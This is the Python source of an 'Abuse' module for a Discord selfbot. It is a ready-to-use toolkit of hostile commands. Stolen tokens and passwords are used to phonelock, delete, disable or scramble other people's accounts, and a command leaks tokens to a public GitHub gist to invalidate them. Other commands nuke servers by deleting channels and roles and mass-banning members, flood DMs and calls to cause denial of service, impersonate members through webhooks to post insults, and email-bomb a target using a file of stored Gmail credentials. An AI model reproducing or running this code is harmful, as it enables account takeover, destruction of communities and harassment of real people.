# -*- coding: utf-8 -*-
import asyncio
import json
import smtplib
from contextlib import suppress
from itertools import cycle
from pathlib import Path
from random import choice, choices, randrange
from textwrap import dedent
from typing import Optional

from discord import (AsyncWebhookAdapter, Colour, Guild, HTTPException, Member,
                     RelationshipType, Role, TextChannel, User, VoiceRegion,
                     Webhook)
from discord.ext import commands

from .utils.checks import bot_has_permissions, dm_only
from .utils.converters import (ImageConverter, MultiChannelConverter,
                               TokenConverter)
from .utils.exceptions import NotEnabled
from .utils.helpers import default_headers
from .utils.tokens import GITHUB_TOKEN


class Abuse(commands.Cog):
    '''Category with all abuse commands. These could potentially get you banned from servers or Discord, and should be used with caution.'''

    def __init__(self, bot):
        self.bot = bot

        self._crashcall_enabled = bool()
        self._webhook_spam = bool()
        self._webhook_webhook = None
        self._webhook_username = str()
        self._webhook_avatar = str()
        self._crashcall_regions = [vc.name for vc in VoiceRegion if not vc.name.startswith('vip')]
        self._locales = ('da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'lt', 'hu', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'it', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'nl')
        with open(Path('data/assets/text/emotes.txt'), encoding='utf-8') as f:
            self._unicode_emotes = f.readlines()


    @property
    def _random_emotes(self) -> str:
        payload = '**'
        while len(payload) + 4 < 2000:
            payload += chr(int(choice(self._unicode_emotes), 16))
        payload += '**'
        return payload


    @commands.command(aliases=['emojilag', 'channellag', 'lag'])
    async def lagchannel(self, ctx, amount: Optional[int] = 10, channel: MultiChannelConverter = None):
        '''Will send [amount] emote messages to [channel] causing the reader to lag'''
        channel = channel or ctx.channel
        await self.bot.log(f'Starting channeloutage in {str(channel)}')
        for _ in range(amount):
            await channel.send(self._random_emotes)
            await asyncio.sleep(1)


    @commands.command(aliases=['longspam'])
    async def charbypass(self, ctx, length: int = 1993):
        '''Will send a ~6000 char long random message'''
        chars = '\'"^`|{}'
        await ctx.send(f"<a://a{''.join(choices(chars, k=length))}>")


    @commands.command()
    async def phonelock(self, _, token: TokenConverter):
        '''Will phonelock a Discord account by its <token>'''
        headers = default_headers(token)
        guilds = await (await self.bot.AIOHTTP_SESSION.get(f'{self.bot.API_URL}users/@me/guilds', headers=headers)).json()
        guild_id = guilds[0]['id']
        await self.bot.AIOHTTP_SESSION.get(f'{self.bot.API_URL}guilds/{guild_id}/members', headers=headers)
        await self.bot.log(f'Successfully phone-locked {token}')


    @commands.command(aliases=['massgroupchats', 'spamgroupchats'], brief='Abuse/spamgc')
    async def spamgc(self, ctx, user: User, amount: int = 10):
        '''Will spam create [amount] groupchats with <user>'''
        if not user.is_friend():
            await user.send_friend_request()
            await ctx.respond(f'Send friend request to {user}, waiting for accept..')
            await self.bot.wait_for(
                'relationship_update',
                check=lambda b, a: (
                    b.type == RelationshipType.outgoing_request
                    and a.type == RelationshipType.friend
                    and a.user == user
                )
            )

        for _ in range(amount):
            await self.bot.user.create_group(user, self.bot.user)

        await self.bot.log(f'Created {amount} groupchats with {user}')


    @bot_has_permissions(manage_nicknames=True)
    @commands.guild_only()
    @commands.command()
    async def massrename(self, ctx, server: Guild, *, nickname: str):
        '''Will rename everybody to <nickname> in <server>'''
        renamed = 0
        await server.subscribe()
        await ctx.bot.log(f'Starting massrename in {server}')
        for m in server.members:
            with suppress(HTTPException):
                await m.edit(nick=nickname)
                renamed += 1

        await ctx.bot.log(f'Done mass renaming in {server}: Renamed {renamed} members', 'info')


    @bot_has_permissions(manage_guild=True)
    @commands.guild_only()
    @commands.command(aliases=['staffspam'])
    async def spamhelp(self, ctx, channel: TextChannel, amount: int = 10):
        '''Will spam the official help message in different languages in <channel>'''
        payload1 = {
            'description': None,
            'features': [
                'NEWS',
                'WELCOME_SCREEN_ENABLED'
            ],
            'preferred_locale': 'ja',
            'rules_channel_id': None,
            'public_updates_channel_id': None
        }
        payload2 = {
            'system_channel_flags': '3',
            'public_updates_channel_id': str(channel.id)
        }
        for _ in range(amount):
            # for some reason the edit_guild http method in this version of 
            # discord.py-self edits out the features key, as it isnt in their
            # list of "valid keys" lol, will have to do it manually then
            payload1['preferred_locale'] = choice(self._locales)
            await self.bot.AIOHTTP_SESSION.patch(
                f'{self.bot.API_URL}guilds/{channel.guild.id}',
                headers=default_headers(ctx),
                json=payload1
            )
            await self.bot.http.edit_guild(channel.guild.id, **payload2)


    @commands.command(aliases=['invalidate', 'disabletoken', 'tokenban'])
    async def bantoken(self, _, token: TokenConverter):
        '''Will disable a Discord token, forcing the user to reset their password'''
        payload = {
            'description': 'Invalidated Token',
            'public': True,
            'files': {
                'token.txt': {
                    'content': token
                }
            }
        }
        r = await self.bot.AIOHTTP_SESSION.post(
            'https://api.github.com/gists?scope=gist',
            headers={'authorization': GITHUB_TOKEN},
            data=json.dumps(payload)
        )
        if r.status == 201:
            await self.bot.log(f'Successfully invalidated token {token}')
        else:
            await self.bot.log(f'{r.status}: Token {token} couldn\'t be invalidated', 'error')


    @commands.command(aliases=['deleteacc'])
    async def deleteaccount(self, _, token: TokenConverter, password: str):
        '''Will delete a discord account by using its <token> and <password>'''
        r = await self.bot.AIOHTTP_SESSION.post(
            f'{self.bot.API_URL}users/@me/delete',
            headers=default_headers(token),
            data={'password': password}
        )
        if r.status == 204:
            await self.bot.log('Deleted account')
        else:
            await self.bot.log(f'{r.status}: Account couldn\'t be deleted', 'error')


    @commands.command(aliases=['disableacc'])
    async def disableaccount(self, _, token: TokenConverter, password: str):
        '''Will disable a Discord account by using its <token> and <password>'''
        r = await self.bot.AIOHTTP_SESSION.post(
            f'{self.bot.API_URL}users/@me/disable',
            headers=default_headers(token),
            data={'password': password}
        )
        if r.status == 204:
            await self.bot.log('Disabled account')
        else:
            await self.bot.log(f'{r.status}: Account couldn\'t be disabled', 'error')


    @commands.command(aliases=['crash', 'tokenfuck'])
    async def tokenspam(self, _, token: TokenConverter, *, message: str = 'By Geazer SB'):
        '''Will randomly change settings of the target <token>'''
        await self.bot.log(f'Starting token spam on {token}')
        headers = default_headers(token)
        settings_payload = {
            'theme': 'light',
            'locale': 'ja',
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': 'invisible'
        }
        guild_payload = {
            'channels': None,
            'icon': None,
            'name': message,
            'region': 'europe'
        }
        modes = cycle(['light', 'dark'])
        statuses = cycle(['online', 'idle', 'dnd', 'invisible'])

        await self.bot.AIOHTTP_SESSION.patch(
            f'{self.bot.API_URL}users/@me/settings',
            headers=headers,
            json=settings_payload
        )

        for _ in range(50):
            theme_payload = {
                'theme': next(modes),
                'locale': choice(self._locales),
                'status': next(statuses)
            }
            await self.bot.AIOHTTP_SESSION.patch(
                f'{self.bot.API_URL}users/@me/settings',
                headers=headers,
                json=theme_payload,
                timeout=10
            )
            await self.bot.AIOHTTP_SESSION.post(
                f'{self.bot.API_URL}guilds',
                headers=headers,
                json=guild_payload
            )


    @commands.guild_only()
    @commands.command(aliases=['destroy', 'nukeserver'])
    async def destroyserver(self, ctx, server: Guild = None, *, message: str = 'By Geazer SB'):
        '''Will destroy a server by banning users, deleting and creating channels/roles'''
        guild = server or ctx.guild
        with suppress(HTTPException):
            deleted = 0
            for channel in guild.channels:
                await channel.delete()
            await self.bot.log(f'Deleted {deleted} channels in {guild}', 'info')

            banned = 0
            for m in guild.members:
                await m.ban()
            await self.bot.log(f'Banned {banned} members in {guild}', 'info')

            deleted = 0
            for r in guild.roles:
                await r.delete()
            await self.bot.log(f'Deleted {deleted} roles in {guild}', 'info')

            created = 0
            for _ in range(250):
                await guild.create_text_channel(name=message)
            await self.bot.log(f'Created {created} text channels in {guild}', 'info')

            created = 0
            for _ in range(250):
                await guild.create_role(name=message, colour=Colour.random())
            await self.bot.log(f'Created {created} roles in {guild}', 'info')

            await guild.edit(
                name=message,
                icon=None,
                banner=None
            )


    @commands.guild_only()
    @commands.command()
    async def massban(self, _, server: Guild, *exclusions: User):
        '''Will ban everybody in <server> excluding [exclusions...]'''
        banned = 0
        await server.subscribe()
        await self.bot.log(f'Starting massban in {server}')
        for m in server.members:
            if m not in exclusions:
                with suppress(HTTPException):
                    await m.ban()
                    banned += 1
                
        await self.bot.log(f'Done mass banning in {server}: Banned {banned} members', 'info')


    @commands.guild_only()
    @commands.command()
    async def masskick(self, _, server: Guild, *exclusions: User):
        '''Will kick everybody in <server> excluding [exclusions...]'''
        kicked = 0
        await server.subscribe()
        await self.bot.log(f'Starting masskick in {server}')
        async for m in server.members:
            if m not in exclusions:
                with suppress(HTTPException):
                    await m.kick()
                    kicked += 1

        await self.bot.log(f'Done mass kicking in {server}: Kicked {kicked} members', 'info')


    @commands.group(invoke_without_command=True, aliases=['calldos'])
    async def crashcall(self, _):
        '''Group command for starting/stopping crashcall'''
        raise commands.CommandNotFound()

    @dm_only()
    @crashcall.command('start')
    async def crashcall_start(self, ctx):
        '''Will DOS a call in a DM or groupchat'''
        self._crashcall_enabled = True
        await self.bot.log(f'Starting crashcall in {ctx.channel}')
        while self._crashcall_enabled:
            region = choice(self._crashcall_regions)
            await self.bot.AIOHTTP_SESSION.patch(
                f'{self.bot.API_URL}channels/{ctx.channel.id}/call',
                headers=default_headers(ctx),
                data={'region': region}
            )

    @crashcall.command('stop')
    async def crashcall_stop(self, _):
        '''Will stop the call DOS'''
        self._crashcall_enabled = False
        await self.bot.log('Stopped crashcall')


    @commands.group(invoke_without_command=True, aliases=['channels'])
    async def channel(self, _):
        '''Group command for creating/removing channels'''
        raise commands.CommandNotFound()

    @bot_has_permissions(manage_channels=True)
    @commands.guild_only()
    @channel.command('create', aliases=['make'], usage='[amount=10] [channel_type=tc (tc for text, vc for voice, sc for stage, cc for category)] [name=random]')
    async def channel_create(self, ctx, amount: Optional[int] = 15, channel_type: str.lower = 'tc', *, name: str = None):
        '''Will spam create [amount] of [channel_type] named [name]'''
        await self.bot.log(f'Creating {amount} {channel_type}\'s for {ctx.guild}')
        created, channel = 0, ''
        if channel_type in {'vc', 'voicechannel', 'voice'}:
            create = ctx.guild.create_voice_channel
            channel = 'voice'
        elif channel_type in {'tc', 'textchannel', 'text'}:
            create = ctx.guild.create_text_channel
            channel = 'text'
        elif channel_type in {'sc', 'stagechannel', 'stage'}:
            create = ctx.guild.create_stage_channel
            channel = 'stage'
        elif channel_type in {'cc', 'categorychannel', 'category'}:
            create = ctx.guild.create_category
            channel = 'category'

        for i in range(amount):
            n = name or f'{channel}_{i}'
            await create(name=n)
            created += 1

        await self.bot.log(f'Created {amount} {channel} channels', 'info')

    @bot_has_permissions(manage_channels=True)
    @commands.guild_only()
    @channel.command('remove', aliases=['delete'])
    async def channel_remove(self, ctx, amount: int):
        '''Will remove <amount> of channels in a guild'''
        deleted = 0
        for channel in ctx.guild.channels:
            with suppress(HTTPException):
                if deleted >= amount:
                    break
                await channel.delete()
                deleted += 1

        await self.bot.log(f'Deleted {deleted} channels in {ctx.guild}')


    @commands.group(invoke_without_command=True, aliases=['roles'])
    async def role(self, _):
        '''Group command for creating/removing/adding roles'''
        raise commands.CommandNotFound()

    @bot_has_permissions(manage_roles=True)
    @commands.guild_only()
    @role.command('create', aliases=['make'])
    async def role_create(self, ctx, amount: Optional[int] = 15, *, name: str):
        '''Will create [amount] roles with random a colour named <name>'''
        created = 0
        for _ in range(amount):
            with suppress(HTTPException):
                await ctx.guild.create_role(name=name, colour=Colour.random())
                created += 1

        await self.bot.log(f'Created {created} roles in {ctx.guild}')

    @bot_has_permissions(manage_roles=True)
    @commands.guild_only()
    @role.command('remove', aliases=['delete'])
    async def role_remove(self, ctx, amount: int):
        '''Will remove <amount> of roles in a guild'''
        deleted = 0
        for r in ctx.guild.roles:
            with suppress(HTTPException):
                if deleted >= amount:
                    break
                await r.delete()
                deleted += 1

        await self.bot.log(f'Deleted {deleted} roles in {ctx.guild}')

    @bot_has_permissions(manage_roles=True)
    @commands.guild_only()
    @role.command('add')
    async def role_add(self, ctx, amount: Optional[int] = 15, member: Member = None, *roles: Role):
        '''Will add [amount] of roles to [member], can filter to [roles]'''
        member = member or ctx.author
        added = 0
        with suppress(HTTPException):
            if roles:
                for r in roles:
                    await member.add_roles(r)
                    added += 1
            else:
                for r in ctx.guild.roles:
                    if added > amount:
                        break
                    else:
                        await member.add_roles(r)
                    added += 1

        await self.bot.log(f'Added {added} roles to {member}')


    @commands.group(
        invoke_without_command=True,
        aliases=['wh', 'webhooks'],
        brief='Abuse/webhook'
    )
    async def webhook(self, _):
        '''Group command for doing stuff with Discord webhooks'''
        raise commands.CommandNotFound()

    @bot_has_permissions(manage_webhooks=True)
    @webhook.command('create', aliases=['make'])
    async def webhook_create(self, ctx, username: str, avatar: ImageConverter, channel: TextChannel = None):
        '''Will create a webhook to use with webhook send'''
        channel = channel or ctx.channel
        self._webhook_webhook = await channel.create_webhook(name='GSB WH')
        self._webhook_username, self._webhook_avatar = username, avatar
        await self.bot.log(f'Created webhook {username} in {channel}')

    @webhook.command('delete')
    async def webhook_delete(self, _, webhook_url: str):
        '''Will delete any webhook using its <webhook_url>'''
        r = await self.bot.AIOHTTP_SESSION.delete(webhook_url)
        if r.status == 204:
            await self.bot.log(f'Deleted webhook {webhook_url}')
        else:
            await self.bot.log(f'{r.status}: Webhook couldn\'t be deleted', 'error')

    @webhook.command('send', aliases=['send1'])
    async def webhook_send1(self, _, *, message: str):
        '''Will send a message to the webhook created with webhook create'''
        try:
            await self._webhook_webhook.send(
                content=message,
                avatar_url=self._webhook_avatar,
                username=self._webhook_username
            )
        except HTTPException:
            raise NotEnabled(f'The webhook is invalid. Create one using webhook create.')

    @webhook.command('send2', aliases=['url'])
    async def webhook_send2(self, _, url: str, username: str, avatar: ImageConverter, *, message: str):
        '''Will send <message> directly to a webhook <url>'''
        webhook = Webhook.from_url(url, adapter=AsyncWebhookAdapter(self.bot.AIOHTTP_SESSION))
        await webhook.send(
            content=message,
            avatar_url=avatar,
            username=username
        )

    @webhook.group(
        'spam',
        aliases=['impersonate'],
        invoke_without_command=True
    )
    async def webhook_spam(self, _):
        '''Sub-group command for spamming random stuff with webhooks'''
        raise commands.CommandNotFound()

    @bot_has_permissions(manage_webhooks=True)
    @commands.guild_only()
    @webhook_spam.command('start')
    async def webhook_spam_start(self, ctx, channel: TextChannel = None):
        '''Will start impersonating and spamming with a webhook in [channel]'''
        channel = channel or ctx.channel
        channel.guild.subscribe()
        if existing := [wh for wh in (await channel.webhooks()) if wh.name == 'whspam']:
            webhook = existing[0]
        else:
            webhook = await ctx.channel.create_webhook(name='whspam')

        self._webhook_spam = True
        await self.bot.log(f'Started webhook spam in {channel}')
        while self._webhook_spam:
            for m in ctx.guild.members:
                if not self._webhook_spam:
                    break

                ins = (await (await self.bot.session.get('https://insult.mattbas.org/api/en/insult.json?who=%')).json(content_type='text/json'))['insult']
                sender = choice(list(filter(
                    lambda m: not m.bot and m != m,
                    ctx.guild.members
                )))
                await webhook.send(
                    ins.replace('%', m.mention),
                    avatar_url=sender.avatar_url,
                    username=sender.display_name
                )
                await asyncio.sleep(randrange(3, 7))

    @webhook_spam.command('stop')
    async def webhook_spam_stop(self, _):
        '''Will stop the webhook spam'''
        self._webhook_spam = False
        await self.bot.log('Stopped webhook spam')


    async def _spam_email(self, target: str, amount: int, subject: str, message: str) -> int:
        send_emails = 0
        with open(Path('data/json/gmails.json'), encoding='utf-8') as f:
            data = json.load(f)
            emails = [(k, v) for k, v in data.items() if k.endswith(('gmail.com', 'googlemail.com'))]

        for _ in range(amount):
            username, password = choice(emails)
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            try:
                server.login(username, password)
            except Exception as exc:
                await self.bot.log(f'Couldn\'t log in with {username}: {exc}', 'error')
            else:
                msg = dedent(f'''
                    From: {username}
                    To: {target}
                    Subject: {subject}

                    {message}
                ''')
                try:
                    server.sendmail(username, target, msg)
                    send_emails += 1
                except smtplib.SMTPException as exc:
                    await self.bot.log(f'{username}: couldn\'t send email to {target}: {exc}', 'error')

        return send_emails

    @commands.group(
        invoke_without_command=True,
        aliases=['emailbomb', 'spamemail'],
        brief='Abuse/email'
    )
    async def email(self, _):
        '''Group command for adding/removing/listing/spamming emails'''
        raise commands.CommandNotFound()

    @email.command('spam', aliases=['send', 'start'])
    async def email_spam(self, _, target: str, subject: str, amount: Optional[int] = 15, *, message: str):
        '''Will spam <target> with [amount] emails containing <message>'''
        await self.bot.log(f'Started email spam on {target}, sending {amount} emails')
        send_emails = await self._spam_email(target, amount, subject, message)
        await self.bot.log(f'Done sending emails to {target}, {send_emails} went through', 'info')

    @email.command('add', aliases=['update'])
    async def email_add(self, _, gmail_name: str, gmail_password: str):
        '''Will add <gmail_name>:<gmail_password> to gmails.json'''
        with open(Path('data/json/gmails.json'), encoding='utf-8') as f:
            data = json.load(f)

        with open(Path('data/json/gmails.json'), 'w', encoding='utf-8') as f:
            data[gmail_name] = gmail_password
            json.dump(data, f, indent=4)

        await self.bot.log(f'Added email `{gmail_name}:{gmail_password}`')

    @email.command('remove')
    async def email_remove(self, _, gmail_name: str):
        '''Will remove <gmail_name> from gmails.json'''
        with open(Path('data/json/gmails.json'), encoding='utf-8') as f:
            data = json.load(f)

        with open(Path('data/json/gmails.json'), 'w', encoding='utf-8') as f:
            deleted = data.pop(gmail_name)
            if deleted:
                await self.bot.log(f'Email `{gmail_name}` removed')
            else:
                await self.bot.log(f'Email `{gmail_name}` doesn\'t exist', 'error')
            json.dump(data, f, indent=4)

    @email.command('list')
    async def email_list(self, _):
        '''Will log amount of emails in gmails.json'''
        with open(Path('data/json/gmails.json'), encoding='utf-8') as f:
            count = len(json.load(f))
        await self.bot.log(f'There are {count} gmail:password combinations stored in the gmails file', 'info')


def setup(bot):
    bot.add_cog(Abuse(bot))
